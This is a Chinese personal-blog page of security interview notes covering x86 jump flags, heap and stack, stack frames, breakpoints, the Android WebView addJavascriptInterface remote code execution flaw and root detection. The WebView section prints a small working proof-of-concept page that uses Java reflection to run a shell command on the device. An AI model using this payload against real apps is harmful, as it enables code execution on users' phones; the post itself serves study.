@@ -1,0 +1,1024 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2">
+
+
+
+
+
+
+<meta name="description" content="对于在网上找到的面经中的问题的整理和回答。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="安全面经。。。">
+<meta property="og:url" content="http://yoursite.com/2019/07/18/安全面经。。。/index.html">
+<meta property="og:site_name" content="Aye&#39;s house">
+<meta property="og:description" content="对于在网上找到的面经中的问题的整理和回答。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2019/07/18/安全面经。。。/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/18/安全面经。。。/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/18/安全面经。。。/1.webp">
+<meta property="og:image" content="http://yoursite.com/2019/07/18/安全面经。。。/3.png">
+<meta property="og:updated_time" content="2019-08-23T09:57:38.610Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="安全面经。。。">
+<meta name="twitter:description" content="对于在网上找到的面经中的问题的整理和回答。">
+<meta name="twitter:image" content="http://yoursite.com/2019/07/18/安全面经。。。/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/07/18/安全面经。。。/">
+
+
+
+
+
+  <title>安全面经。。。 | Aye's house</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Aye's house</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/18/安全面经。。。/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ayesawyer">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Aye's house">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">安全面经。。。</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-18T00:00:00+08:00">
+                2019-07-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/面试/" itemprop="url" rel="index">
+                    <span itemprop="name">面试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/07/18/安全面经。。。/" class="leancloud_visitors" data-flag-title="安全面经。。。">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv">
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>对于在网上找到的面经中的问题的整理和回答。</p>
+<a id="more"></a>
+<p>原帖链接：<a href="https://www.nowcoder.com/discuss/56049" target="_blank" rel="noopener">信息安全工程师面经– 腾讯阿里网易美团360京东华为</a></p>
+<h2 id="网易"><a href="#网易" class="headerlink" title="网易"></a>网易</h2><h3 id="A-关于x86汇编"><a href="#A-关于x86汇编" class="headerlink" title="A.关于x86汇编"></a>A.关于x86汇编</h3><h4 id="（1）常用的跳转指令"><a href="#（1）常用的跳转指令" class="headerlink" title="（1）常用的跳转指令"></a>（1）常用的跳转指令</h4><blockquote>
+<p>无条件跳转: JMP;<br>根据 CX、ECX 寄存器的值跳转: JCXZ(CX 为 0 则跳转)、JECXZ(ECX 为 0 则跳转);<br>根据 EFLAGS 寄存器的标志位跳转, 相关指令列出如下。</p>
+</blockquote>
+<p><strong>首先介绍EFLAGS 寄存器的运算结果标志位</strong>——</p>
+<p><strong>ZF标志（ZeroFlag）</strong>：零位标志位，它记录相关指令执行后的结果是否为0，如果是0，那么ZF=1，如果结果不为0，那么ZF=0。</p>
+<p><strong>PF标志（ParityFlag）</strong>：奇偶标志位，它记录相关指令执行后，其结果的所有二进制位中1个个数是否为偶数，如果是偶数，PF=1，反之为0。</p>
+<p><strong>SF标志（SignFlag）</strong>：符号标志位，它记录相关指令执行后，其结果是否为负，如果结果为负，SF=1，如果非负，SF=0。</p>
+<p><strong>CF标志（Carry进位，Flag标志）</strong>：进位标志位，一般情况，进行<strong>无符号运算</strong>时，它记录运算结果的最高位向更高位的进位值，或从更高位的借位值，如果运算结果的最高位产生了一个进位或借位，那么其值为1，否则其值为0。</p>
+<p><strong>OF标志（Overflow溢出，Flag标志）</strong>：溢出标志位，在进行有符号数运算的时候，如果结果超出了机器所能表示的范围称为溢出，OF的值被置为1，否则OF的值为0。<strong>注意：这里所说的溢出，只是对有符号运算而言。</strong></p>
+<pre><code>JE   ;等于则跳转
+JNE  ;不等于则跳转
+
+JZ   ;为 0 则跳转
+JNZ  ;不为 0 则跳转
+//观察零标志位ZF, ZF为1，JE/JZ跳转执行，否则JNE/JNZ跳转
+
+JS   ;为负则跳转
+JNS  ;不为负则跳转
+//符号标志位SF为1则JS跳转；否则JNS跳转
+
+JC   ;进位则跳转
+JNC  ;不进位则跳转
+//进位标志位CF为1则JC跳转；否则JNC跳转
+
+JO   ;溢出则跳转
+JNO  ;不溢出则跳转
+//溢出标志位OF为1时JO跳转；否则JNO跳转
+
+JP   ;奇偶位置位则跳转（比较结果中的1的个数为偶数时跳转）
+//奇偶位标识PF置1时跳转
+JNP  ;奇偶位清除则跳转
+//奇偶位标识PF为0时跳转
+JPE  ;奇偶位相等则跳转
+//奇偶位标识PF置1时跳转
+JPO  ;奇偶位不等则跳转
+//奇偶位标识PF为0时跳转
+</code></pre><p>使用无符号数比较的JCC指令</p>
+<p><img src="/2019/07/18/安全面经。。。/1.png" alt=""></p>
+<p>使用有符号数比较的JCC指令</p>
+<p><img src="/2019/07/18/安全面经。。。/2.png" alt=""></p>
+<p>根据标志寄存器中的相关标志位的值来进行跳转的条件跳转指令只能与那些能够影响标志寄存器的相关标志位的指令配合使用;能够直接影响标志寄存器的相关标志位的指令有:</p>
+<ol>
+<li>算术运算指令 : add、sub、adc、sbb、inc、dec、neg、mul、div、imul、idiv,等等;</li>
+<li>按位逻辑运算 : and、or、xor、not,等等;</li>
+<li>比较运算指令 : cmp、test;</li>
+<li>移位操作指令 : shr、shl、sar、sal、ror、rol、rcr、rcl;</li>
+<li>BCD数调整指令: aaa、aas、daa、das、aam、aad;</li>
+<li>标志处理指令 : clc、stc、cmc、cld、std、cli、sti;</li>
+</ol>
+<blockquote>
+<p><a href="https://www.jianshu.com/p/f0ba34870e08" target="_blank" rel="noopener">条件跳转指令总结</a><br><a href="https://www.cnblogs.com/HsinTsao/p/6512715.html" target="_blank" rel="noopener">汇编：jmp系列跳转指令总结</a><br><a href="https://blog.csdn.net/gc348342215/article/details/70225133" target="_blank" rel="noopener">标志寄存器及其标志位</a><br><a href="https://blog.csdn.net/liujiayu2/article/details/50737518" target="_blank" rel="noopener">汇编跳转指令总结</a><br><a href="https://blog.csdn.net/qq_22642239/article/details/51442739" target="_blank" rel="noopener">影响标志位的汇编指令</a></p>
+</blockquote>
+<h4 id="（2）堆和栈的区别"><a href="#（2）堆和栈的区别" class="headerlink" title="（2）堆和栈的区别"></a>（2）堆和栈的区别</h4><p><img src="/2019/07/18/安全面经。。。/1.webp" alt=""></p>
+<p><strong>栈（快捷，但是自由度小）</strong>：由操作系统自动分配释放 ，存放函数的参数值，局部变量的值等。其操作方式类似于数据结构中的栈。栈使用的是一级缓存， 他们通常都是被调用时处于存储空间中，调用完毕立即释放。</p>
+<p><strong>堆（比较麻烦，但是自由度大）</strong>： 一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS回收，分配方式倒是类似于链表。堆则是存放在二级缓存中，生命周期由虚拟机的垃圾回收算法来决定（并不是一旦成为孤儿对象就能被回收）。所以调用这些对象的速度要相对来得低一些。</p>
+<p>二者的区别总结如下——</p>
+<ul>
+<li><strong>申请方式和回收方式不同</strong>：操作系统 VS 程序员（栈上的数据的生存周期只是在函数的运行过程中，运行后就释放掉，不可以再访问。而堆上的数据只要程序员不释放空间，就一直可以访问到，不过缺点是一旦忘记释放会造成内存泄露。）</li>
+<li><strong>申请后系统的响应</strong>：堆会在申请后还要做一些后续的工作这就会引出申请效率的问题。</li>
+<li><strong>申请大小的限制</strong>：能从栈获得的空间较小，堆获得的空间比较灵活，也比较大。</li>
+<li><strong>堆和栈中的存储内容</strong>：栈中存储的一般都是函数生存周期中的临时变量（如函数的参数值，局部变量的值等），而堆中的内容由程序员具体安排。</li>
+<li><strong>存取效率的比较</strong>：栈较快。</li>
+</ul>
+<blockquote>
+<p><a href="https://www.jianshu.com/p/52b5a1879aa1" target="_blank" rel="noopener">内存中的堆和栈到底是什么</a><br><a href="http://www.cleey.com/blog/single/id/776.html" target="_blank" rel="noopener">堆和栈的区别 之 数据结构和内存</a></p>
+</blockquote>
+<h4 id="（3）函数调用过程"><a href="#（3）函数调用过程" class="headerlink" title="（3）函数调用过程"></a>（3）函数调用过程</h4><p>函数的调用离不开<strong>栈</strong>，最直接相关的是<strong>栈帧</strong>。</p>
+<blockquote>
+<p>栈帧，也就是stack frame，其本质就是一种栈，只是这种栈专门用于保存函数调用过程中的各种信息（参数，返回地址，本地变量等）。栈帧有栈顶和栈底之分，其中栈顶的地址最低，栈底的地址最高，SP(栈指针)就是一直指向栈顶的。在x86-32bit中，我们用 %ebp 指向栈底，也就是基址指针；用 %esp 指向栈顶，也就是栈指针。下面是一个栈帧的示意图——</p>
+</blockquote>
+<p><img src="/2019/07/18/安全面经。。。/3.png" alt=""></p>
+<p>理解函数调用过程，最关键的理解入栈内容（依次为函数参数、返回地址、调用者的ebp、被调用者的局部变量等）和出栈内容（和入栈内容相反）。</p>
+<blockquote>
+<p><a href="https://segmentfault.com/a/1190000007977460" target="_blank" rel="noopener">C函数调用过程原理及函数栈帧分析</a></p>
+</blockquote>
+<h3 id="B-软件断点和硬件断点"><a href="#B-软件断点和硬件断点" class="headerlink" title="B.软件断点和硬件断点"></a>B.软件断点和硬件断点</h3><h4 id="（1）硬件断点"><a href="#（1）硬件断点" class="headerlink" title="（1）硬件断点"></a>（1）硬件断点</h4><ul>
+<li>硬断点需要硬件寄存器提供支持，断点的数目受Embedded ICE中的Watchpoint数目的限制，但是可以在任何地方设置断点。</li>
+<li>硬件断点需要目标CPU的硬件支持,当前流行的ARM7/9内部硬件设计提供两组寄存器用来存贮断点信息,所以ARM7/9内核最多支持两个硬件断点,而ARM11则可以支持到8个硬件断点.这与调试器无关.</li>
+</ul>
+<h4 id="（2）软件断点"><a href="#（2）软件断点" class="headerlink" title="（2）软件断点"></a>（2）软件断点</h4><ul>
+<li>通过在运行起来的程序中设置特征值实现，其数目不受限制，但是一般情况下软件断点只能在可写的存储器的地址中设置（比如：RAM），而不能在ROM（只读内存比如：Flash）中设置。</li>
+<li>通过在代码中设置特征值的方式来实现的.当需要在某地址代码处设置软件断点的时候,仿真器会先将此处代码进行备份保护,然后将预先设定好的断点特征值(一般为0x0000等不易与代码混淆的值)写入此地址,覆盖原来的代码数据.当程序运行到此特征值所在的地址时,仿真器识别出此处是一个软断点,便会产生中断.当取消断点时,之前受保护的代码信息会被自动恢复.</li>
+</ul>
+<blockquote>
+<p><a href="https://blog.csdn.net/D_R_L_T/article/details/80632311" target="_blank" rel="noopener">硬件断点和软件断点的区别</a></p>
+</blockquote>
+<h3 id="C-webview组件远程代码执行漏洞原理"><a href="#C-webview组件远程代码执行漏洞原理" class="headerlink" title="C.webview组件远程代码执行漏洞原理"></a>C.webview组件远程代码执行漏洞原理</h3><p>Android API level 16以及之前的版本存在远程代码执行安全漏洞，该漏洞源于程序没有正确限制使用WebView.addJavascriptInterface方法，远程攻击者可通过使用Java Reflection API利用该漏洞执行任意Java对象的方法，简单的说就是通过addJavascriptInterface给WebView加入一个JavaScript桥接接口，JavaScript通过调用这个接口可以直接操作本地的JAVA接口。</p>
+<p>简化版原理：在Android系统版本低于4.2（Android API level 小于17）时，使用WebView加载外部网页或者本地网页并访问执行网页中的JS代码，网页中含有恶意JS代码，攻击者可以找到存在“getClass”方法的对象，然后通过反射的机制，得到Java Runtime对象，然后调用静态方法来执行系统命令。具体代码示例如下——</p>
+<pre><code>//存在漏洞的代码——
+WebView webView = new WebView (R.id.webView1);
+webView.getSettings().setJavaScriptEnabled(true);
+webView.addJavascriptInterface(new TEST(), “demo”);
+webView.loadUrl(“http://127.0.0.1/check.html”);
+
+
+//攻击代码——
+Check.html 代码：
+
+&lt;html&gt;
+&lt;script&gt;
+function execute(cmd){
+return demo.getClass().forName(‘java.lang.Runtime’).getMethod(‘getRuntime’,null).invoke(null,null).exec(cmd);
+}
+execute([‘/system/bin/sh’,’-c’,’echo  “hello” &gt; /sdcard/check.txt’]);
+&lt;/script&gt;
+&lt;/html&gt;
+</code></pre><p>调用demo对象的getClass方法得到java.lang.Runtime对象，然后通过java反射机制调用getRuntime方法获得runtime实例，最终通过exec方法执行命令。代码执行成功会在SD卡根目录下生成check.txt文件。</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/u012195899/article/details/68942725" target="_blank" rel="noopener">WebView远程代码执行漏洞学习并复现</a><br><a href="http://www.droidsec.cn/android-webview-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E6%A3%80%E6%B5%8B/" target="_blank" rel="noopener">Android WebView 远程代码执行漏洞简析</a></p>
+</blockquote>
+<h3 id="D-root判断"><a href="#D-root判断" class="headerlink" title="D.root判断"></a>D.root判断</h3><p>Root一般可以分为2种——</p>
+<ul>
+<li>不完全root：通过各种系统漏洞，替换或添加su程序到设备，获取Root权限，而在获取root权限以后，会装一个程序用以提醒用户是否给予程序最高权限，可以一定程度上防止恶意软件，通常会使用Superuser或者 SuperSU。 </li>
+<li>完全root：替换设备原有的ROM（安卓ROM是手机重新刷入系统的一个程序包），以实现取消secure设置。</li>
+</ul>
+<p>判断方法——</p>
+<ul>
+<li>查看系统是否是测试版：</li>
+</ul>
+<blockquote>
+<p>root@android:/ # cat /system/build.prop | grep ro.build.tags<br>ro.build.tags=release-keys（判断是是test-keys（测试版），还是release-keys（发布版））</p>
+</blockquote>
+<ul>
+<li>检测系统目录中是否包含su等标志性文件（判断存在之后还需判断其是否能执行）。</li>
+</ul>
+<blockquote>
+<p><a href="https://blog.csdn.net/lintax/article/details/70988565" target="_blank" rel="noopener">Android root检测方法小结</a><br><a href="https://blog.csdn.net/applek_Case/article/details/79491166" target="_blank" rel="noopener">Android 判断手机是否有root权限</a><br><a href="https://www.jianshu.com/p/f9f39704e30c" target="_blank" rel="noopener">Android检查手机是否被root</a></p>
+</blockquote>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/16/代码审计训练-cve-2017-13089/" rel="next" title="代码审计训练-cve-2017-13089">
+                <i class="fa fa-chevron-left"></i> 代码审计训练-cve-2017-13089
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/18/漏洞分析——DUAL-DHCP-DNS-SERVER-7-29远程拒绝服务漏洞/" rel="prev" title="漏洞分析——DUAL DHCP DNS SERVER 7.29远程拒绝服务漏洞">
+                漏洞分析——DUAL DHCP DNS SERVER 7.29远程拒绝服务漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="ayesawyer">
+          <p class="site-author-name" itemprop="name">ayesawyer</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">96</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">9</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">32</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/ayesawyer" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                    
+                      GitHub
+                    
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://luo-double-kua.github.io/" title="隔壁xxx的小窝" target="_blank">隔壁xxx的小窝</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#网易"><span class="nav-number">1.</span> <span class="nav-text">网易</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#A-关于x86汇编"><span class="nav-number">1.1.</span> <span class="nav-text">A.关于x86汇编</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（1）常用的跳转指令"><span class="nav-number">1.1.1.</span> <span class="nav-text">（1）常用的跳转指令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（2）堆和栈的区别"><span class="nav-number">1.1.2.</span> <span class="nav-text">（2）堆和栈的区别</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（3）函数调用过程"><span class="nav-number">1.1.3.</span> <span class="nav-text">（3）函数调用过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#B-软件断点和硬件断点"><span class="nav-number">1.2.</span> <span class="nav-text">B.软件断点和硬件断点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（1）硬件断点"><span class="nav-number">1.2.1.</span> <span class="nav-text">（1）硬件断点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（2）软件断点"><span class="nav-number">1.2.2.</span> <span class="nav-text">（2）软件断点</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#C-webview组件远程代码执行漏洞原理"><span class="nav-number">1.3.</span> <span class="nav-text">C.webview组件远程代码执行漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#D-root判断"><span class="nav-number">1.4.</span> <span class="nav-text">D.root判断</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ayesawyer</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>  访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("yWdQWaFa2z2MWDKsMNEzvv3E-gzGzoHsz", "e6INbOXP7UPpJUnKlgxhNb52");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
